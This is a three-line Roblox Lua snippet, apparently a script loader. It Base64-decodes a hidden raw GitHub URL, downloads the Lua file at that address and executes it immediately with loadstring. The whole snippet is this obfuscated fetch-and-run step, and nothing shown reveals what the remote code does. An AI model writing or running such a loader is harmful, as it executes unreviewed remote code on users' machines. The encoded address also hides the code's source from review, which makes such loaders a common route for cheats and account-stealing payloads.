local encoded_c = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Nmay85OTQvRGYvcmVmcy9oZWFkcy9tYWluL0MubHVh"
local real_c_url = game:GetService("HttpService"):Base64Decode(encoded_c)
loadstring(game:HttpGet(real_c_url))()
